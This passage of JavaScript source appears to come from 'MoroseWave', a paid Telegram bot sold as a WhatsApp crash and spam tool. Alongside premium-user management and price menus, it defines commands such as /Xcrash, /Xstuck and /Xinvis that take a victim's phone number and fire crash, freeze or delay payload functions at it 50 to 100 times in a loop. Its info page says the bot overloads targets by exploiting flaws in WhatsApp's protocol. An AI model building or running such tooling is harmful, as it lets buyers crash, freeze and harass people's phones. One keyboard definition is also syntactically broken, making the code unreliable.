    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
        if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
            return ctx.reply("❌ ☇ Akses hanya untuk pemilik dan admin"); 
        }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const userWarna = new Map();

// ======================
// WARNA & ICON
// ======================
function getStyle(warna) {
    if (warna === 'merah') return 'danger';
    if (warna === 'biru') return 'primary';
    if (warna === 'hijau') return 'success';
    return 'success';
}

function getDiskoStyle() {
    const random = Math.floor(Math.random() * 3);
    if (random === 0) return 'danger';
    if (random === 1) return 'primary';
    return 'success';
}

const iconIdsList = [
    "5316556616319905664", "5440703719752608257", "5438166923089029724",
    "5438191043625364502", "5449806649533411582", "5330237710655306682",
    "5285084633573110315", "5244968767150109583", "5208464633215611044",
    "5260450573768990626", "5334818215967076232", "6309915906877165527",
    "6086730808968614780", "6089217174126203362", "6086946867298439895",
    "6089124398537642497", "6088971806939550947", "6093818260921258328",
    "6089079808187174973", "6309611273436793918", "6307512258494730630",
    "6307696237713822796", "5256217926448468100", "5440805291434192517",
    "5438181757906069988", "5334738840676475461", "5220037761897085778",
    "5294397698923832095",
    "5413879192267805083", "5231200819986047254", "6028551194861899805",
    "5210956306952758910", "5217822164362739968"
];

function getRandomIconId() {
    return iconIdsList[Math.floor(Math.random() * iconIdsList.length)];
}

function createButton(text, callback, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, callback_data: callback, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

function createUrlButton(text, url, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, url, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

// ======================
// MENU FUNCTIONS
// ======================
function getMenuHome(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homecontrols", 'nav', warna)
        ],
        [
            createUrlButton("𝗧𝗵𝗲 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuControls(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_home", 'nav', warna),
            createButton("HOME", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometoolss", 'nav', warna)
        ],
        [
            createButton("𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝘀", "menu_controls", 'nav', warna)
        ]
    ];
}

function getMenuToolss(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_controls", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homebugs", 'nav', warna)
        ],
        [
            createButton("𝗧𝗼𝗼𝗹𝘀", "menu_toolss", 'nav', warna)
        ]
    ];
}

function getMenuBug(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_hometoolss", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometqto", 'nav', warna)
        ],
        [
            createButton("𝗠𝘂𝗿𝗯𝘂𝗴", "menu_bug", 'nav', warna),
            createButton("𝗧𝗿𝗮𝘀𝗵 𝗕𝘂𝗴", "menu_bug2", 'nav', warna)
        ]
    ];
}

function getMenuTqto(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_homebugs", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_information", 'nav', warna)
        ],
        [
            createButton("𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼", "menu_tqto", 'nav', warna)
        ]
    ];
}

function getMenuInformation(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_tqto", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createButton("𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗖𝗘", "menu_price", 'nav', warna)
        ]
    ];
}

function getMenuPrice(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createUrlButton("𝗕𝗨𝗬", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuCaption(premiumStatus, name, userId, senderStatus, runtimeStatus, page) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

[ STATUS ]
  Premium: ${premiumStatus}
  Name: ${name} (${userId})
  Sender: ${senderStatus}
  Runtime: ${runtimeStatus}
  Guard: Active

[ PAGE ${page}/6 ]
</code></pre>`;
}

function getOpeningMenuCaption(username, userId, senderStatus, runtime) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE ]
──────────────────
Bukan sekadar gelombang,
tapi gema dari keheningan yang berbicara.
Di antara kode dan sunyi,
kita menari di tepi realitas.

──────────────────
 Auto-Update : Enabled
 System      : Online & Active
──────────────────
"Terkadang, kehampaan adalah ruang
di mana kita menemukan jawaban."
</code></pre>`;
}

// ======================
// START MENU (PILIH WARNA)
// ======================
bot.start(async (ctx) => {
    const loadingMessage = await ctx.reply("🤖 <b>MoroseWave Initializing...</b>", { parse_mode: "HTML" });
    const loadingFrames = [
        { text: "🌊 <b>Wave Detecting...</b>", delay: 300 },
        { text: "🕳️ <b>Entering the Void...</b>", delay: 300 },
        { text: "🕸️ <b>Mapping the Infinity...</b>", delay: 300 },
        { text: "🔥 <b>Igniting The Core...</b>", delay: 300 },
        { text: "🌒 <b>MoroseWave Present</b>", delay: 300 },
        { text: "🌑 <b>Everything is Nothing.</b>", delay: 500 }
    ];
    for (const frame of loadingFrames) {
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, null, frame.text, { parse_mode: "HTML" });
            await new Promise(resolve => setTimeout(resolve, frame.delay));
        } catch (error) {
            if (error.response && error.response.error_code === 400) continue;
        }
    }
    try {
        await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
    } catch (error) {}

    await ctx.reply("🎨 Pilih warna tema kamu:", {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔴 MERAH", callback_data: "warna_merah", style: "danger", icon_custom_emoji_id: "5440703719752608257" },
                    { text: "🟢 HIJAU", callback_data: "warna_hijau", style: "success", icon_custom_emoji_id: "5316556616319905664" }
                ],
                [
                    { text: "🔵 BIRU", callback_data: "warna_biru", style: "primary", icon_custom_emoji_id: "5330237710655306682" },
                    { text: "🌈 DISKO", callback_data: "warna_disko", style: "danger", icon_custom_emoji_id: "5244968767150109583" }
                ]
            ]
        }
    });
});

// ======================
// CALLBACK PILIH WARNA → TAMPILKAN MENU PEMBUKA (VIDEO)
// ======================
bot.action(['warna_merah', 'warna_hijau', 'warna_biru', 'warna_disko'], async (ctx) => {
    let warna = 'hijau';
    if (ctx.match[0] === 'warna_merah') warna = 'merah';
    if (ctx.match[0] === 'warna_hijau') warna = 'hijau';
    if (ctx.match[0] === 'warna_biru') warna = 'biru';
    if (ctx.match[0] === 'warna_disko') warna = 'disko';

    userWarna.set(ctx.from.id, warna);
    await ctx.answerCbQuery(`Warna ${warna.toUpperCase()} dipilih!`);
    await ctx.deleteMessage();

    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
    const senderStatus = isWhatsAppConnected ? "✅ CONNECTED" : "❌ DISCONNECTED";
    const runtime = formatRuntime();
    const style = (warna === 'disko') ? getDiskoStyle() : getStyle(warna);

    const openingCaption = getOpeningMenuCaption(username, userId, senderStatus, runtime);

    const keyboard = {
    inline_keyboard: [
        [
            {
                text: "𝗦𝗛𝗢𝗪 𝗦𝗖𝗥𝗜𝗣𝗧",
                callback_data: "open_script",
                style: style,
                icon_custom_emoji_id: getRandomIconId()
            }
        ]
    ]
            [
                {
                    text: "𝗔𝗨𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘",
                    callback_data: "update_now",
                    style: style,
                    icon_custom_emoji_id: getRandomIconId()
                }
            ]
    };

    await ctx.replyWithVideo(thumbnailVideo, {
        caption: openingCaption,
        parse_mode: "HTML",
        reply_markup: keyboard
    });
});

// ======================
// OPEN SCRIPT → MENU HOME (edit ke foto)
// ======================
bot.action('open_script', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia(
            { type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" },
            { reply_markup: { inline_keyboard: keyboard } }
        );
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error:", error);
        }
    }
});

// ======================
// MENU HOME (PAGE 1/6)
// ======================
bot.action('menu_home', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia({ type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_controls', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const controlsMenu = `
<pre><code class="language-javascript">
[ CONTROLS | V29.0 ]

[ SYSTEM ]
  /addbot - Add Sender
  /setcd - Set Cooldown
  /killsesi - Reset Session

[ USER ]
  /addprem - Add Premium
  /delprem - Delete Premium
  /addpremgrup - Add Group Prem
  /delpremgrup - Delete Group Prem
  /blockcmd - Block Command
  /unblockcmd - Unblock Command
  /listblockcmd - List Blocked

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homecontrols', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CONTROL PANEL ]

Menu ini digunakan untuk mengontrol dan mengatur bot.
Anda dapat menambah sender, mengatur cooldown, reset session,
serta mengelola user premium dan grup premium.

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_toolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const toolssMenu = `
<pre><code class="language-javascript">
[ TOOLS | V29.0 ]

[ DEVICE & GEN ]
  /iqc - iPhone Gen
  /sendbokep - Private Tools 18+
  /tiktoksearch - Search TikTok
  /play - Spotify
  /enchtml - Encrypt HTML
  /fixcode - Fix File.js

[ MEDIA & DL ]
  /brat - Brat Sticker
  /tiktok - TikTok Downloader
  /tourl - Image to URL
  /fakecall - Photo to Avatar
  /cekkontol - Check Gender
  /cekkhodam - Check Khodam

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(toolssMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometoolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ TOOLS PANEL ]

Menu ini berisi berbagai tools dan utilitas yang tersedia.
Anda dapat generate device, mencari tiktok, downloader media,
membuat sticker brat, convert media ke url, dan lainnya.

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu = `
<pre><code class="language-javascript">
[ BUG | V29.0 ]

[ CAN SPAM ]
  /Xspamv1 - Delay Invisible
  /Xspamv2 - Delay Bokep
  /Xspamv3 - Delay Porno
  /Xspamv4 - Delay Hard
  /Xspamv5 - Freeze Invisible
  /Xspamv6 - Drain Kuota

Note: 
 • Nomor Wajib Bisa Chat Agar Tidak Mudah Kena Limit

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug2', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu2 = `
<pre><code class="language-javascript">
[ TRASH | V29.0 ]
 
[ NUMBER BUG ]
  /Xcrash - Crash Hard
  /Xstuck - Stuck Home
  /Xclick - ForceClose Click
  /Xbeku - Freeze Invisible
  /Xcrashinvis - Crash Invisible
  /Xinvisbeku - Delay X Freeze
  /Xinvis - DelayHard Invisible
  /Xscreen - Blank Infinity
  /Xengine - Blank No Click
  /Xbuldo - Bulldozer
  
[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu2, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homebugs', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ BUG PANEL ]

Menu ini berisi kumpulan bug yang tersedia.
Gunakan dengan bijak dan bertanggung jawab.
Setiap command memiliki fungsi yang berbeda-beda.

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_tqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const tqtoMenu = `
<pre><code class="language-javascript">
[ CREDIT | V29.0 ]

  @Luctadvorisme (Dev)
  All Buyers & Users

  Everything is Nothing.

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(tqtoMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CREDIT PANEL ]

Terima kasih telah menggunakan MoroseWave Bot

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_information', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const informationMenu = `
<pre><code class="language-javascript">
[ INFORMATION | V29.0 ]

  WhatsApp Bug Concept

  Metode yang digunakan dalam bot ini adalah
  eksploitasi celah keamanan pada protokol WhatsApp.

  Cara Kerja:
  - Mengirim payload berulang ke target
  - Memanfaatkan delay response server
  - Overload koneksi target

  Peringatan:
  Gunakan dengan bijak dan tanggung jawab sendiri.
  Developer tidak bertanggung jawab atas penyalahgunaan.

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuInformation(warna);
    try {
        await ctx.editMessageCaption(informationMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_price', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const priceMenu = `
<pre><code class="language-javascript">
[ PRICE SCRIPT | V29.0 ]

  𝐌𝐎𝐑𝐎𝐒𝐄𝐖𝐀𝐕𝐄

  ➣ SCRIPT : 20k
  ➣ RESS   : 25k
  ➣ PT     : 30k
  ➣ MODZ   : 35k
  ➣ TK     : 40k
  ➣ CEO    : 50k
  ➣ OWN    : 60k

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuPrice(warna);
    try {
        await ctx.editMessageCaption(priceMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.command("Xcrash", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xcrash 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await xnvcomb2(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xstuck", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xstuck 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 65; i++) {
    await luffystuck(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xclick", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xclick 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 70; i++) {
    await FORCLOSENEWFUNCARO(sock, target);
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xbeku", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xbeku 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
    await bekudelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xcrashinvis", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xcrashinvis 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await luffycrash(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xinvisbeku", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xinvisbeku 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 60; i++) {
    await XcrashXi(sock, target);
    await sleep(800);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xinvis", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xinvis 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 75; i++) {
    await delayHard(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

